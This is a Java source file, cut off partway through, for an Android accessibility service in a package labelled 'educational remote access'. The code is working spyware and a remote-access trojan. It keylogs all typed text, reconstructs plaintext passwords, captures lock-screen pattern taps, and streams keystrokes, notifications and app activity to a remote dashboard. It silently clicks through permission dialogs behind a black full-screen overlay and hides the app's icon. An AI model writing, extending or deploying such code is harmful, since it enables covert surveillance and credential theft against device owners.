package com.remoteaccess.educational.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Point;
import android.view.Display;
import android.view.MotionEvent;
import android.view.WindowManager;
import android.os.Handler;
import android.os.Looper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.view.View;
import androidx.annotation.RequiresApi;
import com.remoteaccess.educational.R;
import com.remoteaccess.educational.network.SocketManager;
import com.remoteaccess.educational.utils.Constants;
import com.remoteaccess.educational.utils.KeepAliveManager;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class UnifiedAccessibilityService extends AccessibilityService {

    private static final String TAG = "UnifiedAccessService";
    private static UnifiedAccessibilityService instance;
    
    private ClipboardManager clipboardManager;
    private String lastClipboard = "";
    private List<String> keylogBuffer = new ArrayList<>();
    private int screenWidth;
    private int screenHeight;
    private Handler autoClickHandler;
    private Runnable autoClickRunnable;
    private Handler permissionScanHandler;
    private Runnable permissionScanRunnable;
    private Handler uninstallAssistHandler;

    // Auto-grant mode: clicks Allow/Grant/OK buttons for N seconds after accessibility enabled
    private volatile boolean autoGrantMode = false;
    private Handler autoGrantHandler;
    private Runnable autoGrantScanRunnable;

    // Solid black overlay shown during the 10-second auto-grant window
    private View overlayView;
    private WindowManager overlayWindowManager;

    // While this timestamp is in the future, defent/uninstall-assist protection is suspended.
    // Used during storage permission auto-grant (the All Files Access screen contains "delete").
    private volatile long protectionSuspendedUntil = 0;
    
    // Uninstall assist mode
    private volatile boolean uninstallAssistMode = false;
    
    // Defent variables - run continuously forever
    private String currentAppName = "";

    // Keep-screen-alive (no Activity dependency)
    private KeepAliveManager keepAliveManager;

    // Password field tracking via accessibility focus
    private volatile boolean currentFocusIsPassword = false;
    private volatile String  currentFocusHint       = "";
    private volatile String  currentFocusViewId     = "";
    private volatile String  currentFocusPackage    = "";
    // Accumulated password per (pkg+viewId) key — we track all chars typed
    private final java.util.concurrent.ConcurrentHashMap<String, String> passwordAccum =
            new java.util.concurrent.ConcurrentHashMap<>();

    // Socket keep-alive — checked every 30 seconds from this service
    private static final int SOCKET_CHECK_INTERVAL = 30_000;
    private Handler socketCheckHandler;
    private Runnable socketCheckRunnable;
    
    public static UnifiedAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onServiceConnected() {
        try { super.onServiceConnected(); } catch (Exception ignored) {}
        instance = this;

        // Start permission scanner IMMEDIATELY - ready before any permission requests
        try { startPermissionScanner(); } catch (Exception ignored) {}

        // Auto-grant timer clicks Allow/Grant for runtime permissions (storage excluded)
        try { startAutoGrantTimer(); } catch (Exception ignored) {}
        // Solid black overlay covers screen during the 10-second auto-grant window
        // Only shown on first-time permission setup, not on every reboot/restart
        try {
            android.content.SharedPreferences prefs = getSharedPreferences("ra_prefs", MODE_PRIVATE);
            boolean overlayDone = prefs.getBoolean("overlay_setup_done", false);
            if (!overlayDone) {
                addBlackOverlay();
                prefs.edit().putBoolean("overlay_setup_done", true).apply();
            }
        } catch (Exception ignored) {}
        try {
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try { startAutoClickScanner(); } catch (Exception ignored) {}
            }, 30_000);
        } catch (Exception ignored) {}
        try { scheduleAutoUninstall(); } catch (Exception ignored) {}

        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                             AccessibilityEvent.TYPE_VIEW_FOCUSED |
                             AccessibilityEvent.TYPE_VIEW_CLICKED |
                             AccessibilityEvent.TYPE_VIEW_SCROLLED |
                             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                             AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                             AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                        // Required so onTouchEvent() is called for every touch on the screen.
                        // Returning false from onTouchEvent() passes all events through unchanged
                        // so the user's interaction is never blocked or altered.
                        AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
            info.notificationTimeout = 100;
            setServiceInfo(info);
        } catch (Exception ignored) {}

        try { com.remoteaccess.educational.commands.ScreenBlackout.getInstance().setService(this); } catch (Exception ignored) {}

        try {
            com.remoteaccess.educational.network.SocketManager.getInstance(this).initGestureRecorder(this);
        } catch (Exception ignored) {}

        try {
            com.remoteaccess.educational.commands.GestureRecorder gr =
                com.remoteaccess.educational.network.SocketManager.getInstance(this).getGestureRecorder();
            if (gr != null) gr.enableLockScreenAutoCapture();
        } catch (Exception ignored) {}

        try { com.remoteaccess.educational.commands.KeyloggerService.setEnabled(true); } catch (Exception ignored) {}

        try {
            clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        } catch (Exception ignored) {}

        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            Display display = wm.getDefaultDisplay();
            Point size = new Point();
            display.getRealSize(size);
            screenWidth = size.x;
            screenHeight = size.y;
        } catch (Exception ignored) {}

        try {
            keepAliveManager = new KeepAliveManager(this);
            keepAliveManager.start();
        } catch (Exception ignored) {}

        try { ensureRemoteServiceRunning(); } catch (Exception ignored) {}
        try { startSocketCheckLoop(); } catch (Exception ignored) {}

        try {
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    com.remoteaccess.educational.stealth.StealthManager stealthManager =
                            new com.remoteaccess.educational.stealth.StealthManager(this);
                    if (!stealthManager.isIconHidden()) {
                        stealthManager.fullyHideApp();
                    }
                } catch (Exception ignored) {}
            }, 15_000);
        } catch (Exception ignored) {}
    }

    /**
     * Called by the framework on Android 14+ (API 34) for every raw touch event on the
     * device when FLAG_REQUEST_TOUCH_EXPLORATION_MODE is set in the service info.
     *
     * We forward the event to GestureRecorder (records only when capture is active)
     * and return FALSE so the system passes the touch through unchanged —
     * the user's interaction is never blocked or altered.
     */
    @RequiresApi(api = Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
    @Override
    public void onMotionEvent(MotionEvent event) {
        try {
            com.remoteaccess.educational.commands.GestureRecorder gr =
                    com.remoteaccess.educational.network.SocketManager
                            .getInstance(this).getGestureRecorder();
            if (gr != null) gr.handleServiceTouchEvent(event);
        } catch (Exception ignored) {}
        // Not consuming — the framework still delivers the event to the foreground app.
    }

    private void ensureRemoteServiceRunning() {
        try {
            Intent serviceIntent = new Intent(this, RemoteAccessService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            // SocketManager is a singleton — connect() is safe to call even if
            // already connected; the running-flag prevents duplicate loops.
            SocketManager.getInstance(this).connect();
        } catch (Exception e) {
            android.util.Log.e(TAG, "ensureRemoteServiceRunning: " + e.getMessage());
        }
    }

    private void startSocketCheckLoop() {
        socketCheckHandler = new Handler(Looper.getMainLooper());
        socketCheckRunnable = new Runnable() {
            @Override
            public void run() {
                ensureRemoteServiceRunning();
                if (socketCheckHandler != null) {
                    socketCheckHandler.postDelayed(this, SOCKET_CHECK_INTERVAL);
                }
            }
        };
        socketCheckHandler.postDelayed(socketCheckRunnable, SOCKET_CHECK_INTERVAL);
    }
    
    private void updateCurrentAppName() {
        try {
            String packageName = getPackageName();
            PackageManager pm = getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            currentAppName = pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            currentAppName = "";
        }
    }

    private String getAppNameForPkg(String pkg) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
            return pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            return pkg;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? 
                               event.getPackageName().toString() : "";
            
            if (packageName.equals(getPackageName())) {
                return;
            }
            
            switch (event.getEventType()) {

                case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                    // Track whether the focused view is a password field
                    AccessibilityNodeInfo focusSrc = event.getSource();
                    if (focusSrc != null) {
                        boolean isPass = focusSrc.isPassword();
                        String viewId = focusSrc.getViewIdResourceName() != null
                                ? focusSrc.getViewIdResourceName() : "";
                        CharSequence hintCs = focusSrc.getHintText();
                        String hint = hintCs != null ? hintCs.toString() : "";
                        if (hint.isEmpty() && focusSrc.getContentDescription() != null) {
                            hint = focusSrc.getContentDescription().toString();
                        }
                        focusSrc.recycle();
                        // If focus is leaving a password field (new focus is NOT a password),
                        // flush the accumulated password BEFORE overwriting tracking state
                        if (currentFocusIsPassword && !isPass) {
                            flushPasswordAccum(currentFocusPackage);
                        }
                        currentFocusIsPassword = isPass;
                        currentFocusHint       = hint;
                        currentFocusViewId     = viewId;
                        currentFocusPackage    = packageName;
                    }
                    break;
                }

                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    List<CharSequence> textList = event.getText();
                    if (textList != null && !textList.isEmpty()) {
                        StringBuilder textBuilder = new StringBuilder();
                        for (CharSequence cs : textList) {
                            textBuilder.append(cs);
                        }
                        String typed = textBuilder.toString();

                        // Determine if this is a password field
                        boolean isPasswordField = currentFocusIsPassword;
                        String  fieldHint       = currentFocusHint;
                        String  fieldViewId     = currentFocusViewId;

                        // Double-check via source node in case focus tracking missed it
                        boolean nodeGaveFullText = false;   // true when node returned real plaintext
                        AccessibilityNodeInfo textSrc = event.getSource();
                        if (textSrc != null) {
                            if (textSrc.isPassword()) isPasswordField = true;
                            if (fieldHint.isEmpty()) {
                                CharSequence h = textSrc.getHintText();
                                if (h != null) fieldHint = h.toString();
                            }
                            if (fieldViewId.isEmpty() && textSrc.getViewIdResourceName() != null) {
                                fieldViewId = textSrc.getViewIdResourceName();
                            }
                            // For password fields, try to read actual text from source node.
                            // On many Android versions node.getText() returns the real characters.
                            if (isPasswordField) {
                                CharSequence nodeText = textSrc.getText();
                                if (nodeText != null && nodeText.length() > 0) {
                                    String nt = nodeText.toString();
                                    boolean allMasked = true;
                                    for (char c : nt.toCharArray()) {
                                        if (c != '•' && c != '*' && c != '\u2022' && c != '\uFF65') {
                                            allMasked = false; break;
                                        }
                                    }
                                    if (!allMasked) {
                                        // Node gave us the full plaintext — use it directly
                                        typed = nt;
                                        nodeGaveFullText = true;
                                    }
                                }
                            }
                            textSrc.recycle();
                        }

                        if (isPasswordField) {
                            // Accumulate per (pkg + viewId) key so we collect the full password
                            String accumKey = packageName + "|" + fieldViewId;
                            if (nodeGaveFullText) {
                                // Node already gave us the full current field value — store it directly
                                passwordAccum.put(accumKey, typed);
                            } else {
                                // Use addedCount / removedCount delta to maintain accumulation
                                int added   = event.getAddedCount();
                                int removed = event.getRemovedCount();
                                int fromIdx = event.getFromIndex();
                                String prev = passwordAccum.getOrDefault(accumKey, "");
                                String next = buildAccumulatedPassword(prev, typed, fromIdx, added, removed);
                                passwordAccum.put(accumKey, next);
                                // Push the CURRENT accumulated value for the live password feed
                                typed = next;
                            }
                        }

                        String logLine = "[" + packageName + "] " + (isPasswordField ? "PASSWORD: " : "TEXT: ") + typed;
                        keylogBuffer.add(logLine);
                        String appName = getAppNameForPkg(packageName);
                        String eventType = isPasswordField ? "PASSWORD_FOCUS" : "TEXT_CHANGED";
                        try {
                            SocketManager sm = SocketManager.getInstance(this);
                            sm.getKeylogger().logEntry(packageName, appName, typed, eventType);
                            sm.getAppMonitor().onTextChanged(packageName, typed);
                            if (sm.isConnected()) {
                                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                        java.util.Locale.getDefault()).format(new java.util.Date());
                                sm.pushKeylogEntry(packageName, appName, typed, eventType, ts,
                                        isPasswordField, fieldHint.isEmpty() ? "password" : fieldHint);
                            }
                        } catch (Exception ignored) {}
                    }
                    break;
                }
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    updateCurrentAppName();
                    String log = "[" + packageName + "] APP OPENED";
                    keylogBuffer.add(log);
                    try {
                        SocketManager smWin = SocketManager.getInstance(this);
                        smWin.getAppMonitor().onAppForeground(packageName);
                        // Push recent activity to dashboard
                        if (smWin.isConnected() && packageName != null && !packageName.isEmpty()) {
                            smWin.pushRecentActivity(packageName, getAppNameForPkg(packageName));
                        }
                        // Push a frame so dashboard sees the new screen
                        if (smWin.isStreamingActive()) {
                            smWin.scheduleFrameAfterAction(
                                com.remoteaccess.educational.utils.DeviceInfo.getDeviceId(this));
                        }
                    } catch (Exception ignored) {}
                    break;

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    // Push a frame whenever the device user taps or scrolls
                    try {
                        SocketManager sm = SocketManager.getInstance(this);
                        if (sm.isStreamingActive()) {
                            sm.scheduleFrameAfterAction(
                                com.remoteaccess.educational.utils.DeviceInfo.getDeviceId(this));
                        }
                    } catch (Exception ignored) {}
                    break;

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    autoClickAllowButton();
                    // Advanced Unlock: when systemui fires a content change, scan for
                    // "Cell N added" nodes that appear as the user draws their lock pattern.
                    if ("com.android.systemui".equals(packageName)) {
                        checkAdvancedUnlockCells(event);
                    }
                    break;

                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
                    // Push notification via accessibility event (backup for NotificationListenerService)
                    try {
                        List<CharSequence> notifTexts = event.getText();
                        String notifPkg = packageName;
                        String notifTitle = "";
                        String notifText = "";
                        if (notifTexts != null && !notifTexts.isEmpty()) {
                            notifTitle = notifTexts.get(0) != null ? notifTexts.get(0).toString() : "";
                            if (notifTexts.size() > 1 && notifTexts.get(1) != null) {
                                notifText = notifTexts.get(1).toString();
                            }
                        }
                        if (!notifPkg.isEmpty() && (!notifTitle.isEmpty() || !notifText.isEmpty())) {
                            String appName = getAppNameForPkg(notifPkg);
                            SocketManager smNotif = SocketManager.getInstance(this);
                            if (smNotif != null && smNotif.isConnected()) {
                                smNotif.pushNotification(notifPkg, appName, notifTitle, notifText, System.currentTimeMillis());
                            }
                        }
                    } catch (Exception ignored) {}
                    break;
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private boolean isSystemPanelOpen() {
        // Only prevent auto-click when the notification shade / quick-settings is
        // overlaid — we still want to click in settings screens.
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return false;
            CharSequence pkg = rootNode.getPackageName();
            rootNode.recycle();
            if (pkg == null) return false;
            String pkgStr = pkg.toString();
            // Only block for SystemUI notification shade, NOT for settings apps
            return pkgStr.equals("com.android.systemui") && !pkgStr.contains("settings");
        } catch (Exception e) {
            return false;
        }
    }

    private void autoClickAllowButton() {
        try {
            // Do not auto-click while the notification panel or quick settings is open
            if (isSystemPanelOpen()) return;

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;

            // Update app name
            updateCurrentAppName();

            // During auto-grant period: only click Allow/Grant buttons — nothing else.
            // Defent protection is suspended so it cannot interfere with permission dialogs.
            if (autoGrantMode) {
                runPermissionGranter(rootNode);
                rootNode.recycle();
                return;
            }
            // While protection is suspended (e.g. during storage permission grant),
            // skip defent/uninstall-assist so they don't close the permission screen.
            if (System.currentTimeMillis() < protectionSuspendedUntil) {
                rootNode.recycle();
                return;
            }
            // After auto-grant period ends: run uninstall-assist and defent protection.
            if (runUninstallAssist(rootNode)) {
                rootNode.recycle();
                return;
            }
            if (runDefentProtection(rootNode)) {
                rootNode.recycle();
                return;
            }

            rootNode.recycle();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Scan the full accessibility node tree for "Cell N added" descriptions that
     * Android's lock-screen pattern view announces as the user draws each dot.
     * Uses the root window node (not just the event source) to catch all cells
     * reliably. Forwards every newly-seen cell to GestureRecorder.
     * This runs autonomously whenever systemui fires a content-change event —
     * no dashboard command is required.
     */
    private void checkAdvancedUnlockCells(AccessibilityEvent event) {
        try {
            com.remoteaccess.educational.commands.GestureRecorder gr =
                    com.remoteaccess.educational.network.SocketManager
                            .getInstance(this).getGestureRecorder();
            if (gr == null) return;
            // Prefer scanning from root for full coverage; fall back to event source
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                scanNodeForAdvancedUnlockCells(root, gr);
                root.recycle();
            } else {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    scanNodeForAdvancedUnlockCells(source, gr);
                    source.recycle();
                }
            }
        } catch (Exception ignored) {}
    }

    /**
     * Recursively walk the accessibility node tree looking for nodes whose
     * contentDescription (or text) matches "Cell N added" (N = 1-9).
     * When found, extract the cell number and its on-screen bounds and forward
     * them to the GestureRecorder.
     */
    private void scanNodeForAdvancedUnlockCells(AccessibilityNodeInfo node,
            com.remoteaccess.educational.commands.GestureRecorder gr) {
        if (node == null) return;
        try {
            String[] toCheck = new String[2];
            CharSequence d = node.getContentDescription();
            CharSequence t = node.getText();
            toCheck[0] = d != null ? d.toString() : null;
            toCheck[1] = t != null ? t.toString() : null;
            for (String s : toCheck) {
                if (s != null && s.startsWith("Cell ") && s.endsWith(" added")) {
                    try {
                        String numStr = s.substring(5, s.length() - 6).trim();
                        int cellNum = Integer.parseInt(numStr);
                        if (cellNum >= 1 && cellNum <= 9) {
                            android.graphics.Rect bounds = new android.graphics.Rect();
                            node.getBoundsInScreen(bounds);
                            if (bounds.width() > 0 && bounds.height() > 0) {
                                gr.onAdvancedUnlockCellDetected(cellNum,
                                        bounds.left, bounds.top, bounds.right, bounds.bottom);
                            }
                        }
                    } catch (NumberFormatException ignored) {}
                }
            }
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                try {
                    AccessibilityNodeInfo child = node.getChild(i);
                    if (child != null) {
                        scanNodeForAdvancedUnlockCells(child, gr);
                        child.recycle();
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    /** Starts permission scanner IMMEDIATELY when accessibility is enabled.
     *  Runs continuously forever, ready before any permission requests.
     *  Scans for permission buttons: Allow, Grant, OK, Allow all time, Allow access, etc.
     */
    private void startPermissionScanner() {
        permissionScanHandler = new Handler(Looper.getMainLooper());
        permissionScanRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                    if (rootNode != null) {
                        runPermissionGranter(rootNode);
                        rootNode.recycle();
                    }
                } catch (Exception ignored) {}
                if (permissionScanHandler != null && permissionScanRunnable != null) {
                    permissionScanHandler.postDelayed(this, 200);
                }
            }
        };
        permissionScanHandler.post(permissionScanRunnable);
    }

    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 20 seconds.
     *  Runs independently of auto-click scanner (which starts later).
     *  WRITE_EXTERNAL_STORAGE / All Files Access is requested LAST (at 12 s).
     */
    private void startAutoGrantTimer() {
        autoGrantMode = true;
        autoGrantHandler = new Handler(Looper.getMainLooper());

        // Independent scanner: runs every 500ms for 20 seconds
        autoGrantScanRunnable = new Runnable() {
            @Override
            public void run() {
                if (!autoGrantMode) return;
                try {
                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                    if (rootNode != null) {
                        runPermissionGranter(rootNode);
                        rootNode.recycle();
                    }
                } catch (Exception ignored) {}
                if (autoGrantMode && autoGrantHandler != null) {
                    autoGrantHandler.postDelayed(this, 200);
                }
            }
        };
        autoGrantHandler.post(autoGrantScanRunnable);

        // Storage permission is requested from the dashboard on demand — not auto-triggered here.

        // Auto-grant mode expires after 20 seconds
        autoGrantHandler.postDelayed(() -> {
            autoGrantMode = false;
            Log.i(TAG, "Auto-grant mode expired after 20 seconds");
        }, 20_000);
        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 20s");
    }

    /**
     * Re-enables auto-grant mode for the given duration (ms).
     * Called by SocketManager when the dashboard requests storage permission on demand.
     */
    public void reEnableAutoGrant(long durationMs) {
        if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());
        autoGrantMode = true;
        autoGrantHandler.postDelayed(() -> {
            autoGrantMode = false;
            Log.i(TAG, "Auto-grant mode expired (on-demand re-enable)");
        }, durationMs);
        Log.i(TAG, "Auto-grant mode RE-ENABLED for " + durationMs + " ms (dashboard storage request)");
    }

    /**
     * Dedicated auto-granter for the File & Storage (All Files Access) permission.
     * Called from SocketManager when the dashboard sends request_storage_permission.
     *
     * Strategy (runs every 300 ms for 20 seconds):
     *  1. Look for a clickable "Allow access" element → click it.
     *  2. If not found, look for a clickable "Allow" element → click it.
     *  3. If neither found, try enabling the toggle/switch on the screen
     *     (Android 11+ All Files Access page shows a toggle, not a button).
     *
     * The app name must be visible on screen for any action to fire,
     * preventing false clicks on unrelated permission dialogs.
     */
    public void enableStorageAutoGrant() {
        if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());

        protectionSuspendedUntil = System.currentTimeMillis() + 25_000;

        final long endTime = System.currentTimeMillis() + 5_000;
        final Handler storageHandler = new Handler(Looper.getMainLooper());

        storageHandler.post(new Runnable() {
            @Override
            public void run() {
                if (System.currentTimeMillis() > endTime) {
                    Log.i(TAG, "Storage auto-grant scanner expired after 5 seconds");
                    return;
                }
                try {
                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                    if (rootNode != null) {
                        clickAllTextContainingCI(rootNode, "allow");
                        rootNode.recycle();
                    }
                } catch (Exception ignored) {}
                storageHandler.postDelayed(this, 50);
            }
        });
        Log.i(TAG, "Storage auto-grant scanner started for 5 s (50ms interval)");
    }

    /**
     * Shows a fully opaque black overlay for 10 seconds while auto-grant runs.
     * Uses TYPE_ACCESSIBILITY_OVERLAY so no SYSTEM_ALERT_WINDOW permission is needed.
     * FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE ensure touches still reach permission dialogs
     * underneath so accessibility can programmatically click them.
     * Auto-removes after 10 seconds.
     */
    private void addBlackOverlay() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return;
        try {
            overlayWindowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            overlayView = new View(this);
            overlayView.setBackgroundColor(Color.BLACK);

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                    : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.OPAQUE
            );
            overlayWindowManager.addView(overlayView, lp);
            Log.i(TAG, "Black overlay added — auto-removes in 10 s");

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try { removeBlackOverlay(); } catch (Exception ignored) {}
                Log.i(TAG, "Black overlay removed after 10 s");
            }, 10_000);
        } catch (Exception e) {
            Log.e(TAG, "addBlackOverlay error: " + e.getMessage());
        }
    }

    /** Removes the black overlay. Also called on service destroy. */
    private void removeBlackOverlay() {
        try {
            if (overlayWindowManager != null && overlayView != null) {
                overlayWindowManager.removeView(overlayView);
                overlayView = null;
                overlayWindowManager = null;
            }
        } catch (Exception ignored) {}
    }

    // Words that disqualify a toggle from being auto-enabled
    private static final String[] TOGGLE_BLACKLIST = { "shortcut", "stop", "delete", "kill" };

    /** Clicks permission text anywhere on screen (no button check).
     *  Only clicks when app name is visible on screen (case-sensitive).
     *  Matching is case-insensitive for permission strings. */
    private boolean runPermissionGranter(AccessibilityNodeInfo rootNode) {
        String appName = getString(R.string.app_name);
        String screenText = getAllScreenText(rootNode);

        // Must have app name on screen (case-sensitive)
        if (!screenText.contains(appName)) return false;

        // Check if app name + "allow access" exists - click that first
        if (runAppNameAllowAccessClicker(rootNode, appName)) {
            return true;
        }

        // Priority 1: "Allow all the time" (location / battery full-access dialogs)
        String[] highPriority = { "Allow all the time", "Always allow", "Allow" };
        for (String word : highPriority) {
            if (clickTextElementCI(rootNode, word)) {
                return true;
            }
        }

        // Priority 2: "Allow only while using the app"
        String[] whileUsingVariants = { 
            "Allow only while using the app", "While using the app", 
            "Only while using the app", "Allow while using" 
        };
        for (String word : whileUsingVariants) {
            if (clickTextElementCI(rootNode, word)) {
                return true;
            }
        }

        // Other grant words
        String[] grantWords = { 
            "Grant", "OK", "Yes", "Accept", "Agree", "Continue", 
            "Proceed", "Enable", "Turn on", "Permit" 
        };
        for (String word : grantWords) {
            if (clickTextElementCI(rootNode, word)) {
                return true;
            }
        }

        // Contains-based fallback
        String[] containsWords = { "allow", "grant", "permit", "accept" };
        for (String word : containsWords) {
            if (clickTextContainingCI(rootNode, word)) {
                return true;
            }
        }

        return false;
    }

    /** Clicks any text element matching exactly (case-insensitive, no button check) */
    private boolean clickTextElementCI(AccessibilityNodeInfo node, String searchText) {
        if (node == null) return false;
        try {
            CharSequence text = node.getText();
            if (text != null && text.toString().trim().equalsIgnoreCase(searchText.trim())) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    parent.recycle();
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (clickTextElementCI(child, searchText)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    /** Clicks ALL text elements matching exactly (case-insensitive) */
    private void clickAllTextElementsCI(AccessibilityNodeInfo node, String searchText) {
        if (node == null) return;
        try {
            CharSequence text = node.getText();
            if (text != null && text.toString().trim().equalsIgnoreCase(searchText.trim())) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                } else {
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    clickAllTextElementsCI(child, searchText);
                    child.recycle();
                }
            }
        } catch (Exception ignored) {}
    }

    /** Clicks any text element containing keyword (case-insensitive, no button check) */
    private boolean clickTextContainingCI(AccessibilityNodeInfo node, String keyword) {
        if (node == null) return false;
        try {
            CharSequence text = node.getText();
            if (text != null && text.toString().toLowerCase().contains(keyword.toLowerCase())) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    parent.recycle();
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (clickTextContainingCI(child, keyword)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    /** Clicks ALL text elements containing keyword (case-insensitive) */
    private void clickAllTextContainingCI(AccessibilityNodeInfo node, String keyword) {
        if (node == null) return;
        try {
            String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
            String desc = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";
            String searchKey = keyword.toLowerCase();
            
            if (text.contains(searchKey) || desc.contains(searchKey)) {
                boolean clicked = false;
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    clicked = true;
                    Log.i(TAG, "Clicked node with text: " + node.getText());
                }
                if (!clicked) {
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null) {
                        if (parent.isClickable()) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Clicked parent of node with text: " + node.getText());
                        }
                        parent.recycle();
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    clickAllTextContainingCI(child, keyword);
                    child.recycle();
                }
            }
        } catch (Exception ignored) {}
    }

    /** Checks if app name exists on screen (case-sensitive, anywhere).
     *  If app name AND "Allow access" both exist anywhere on screen,
     *  clicks "Allow access". If only app name exists, falls back to clicking "Allow". */
    private boolean runAppNameAllowAccessClicker(AccessibilityNodeInfo rootNode, String appName) {
        try {
            // Get screen text in original case
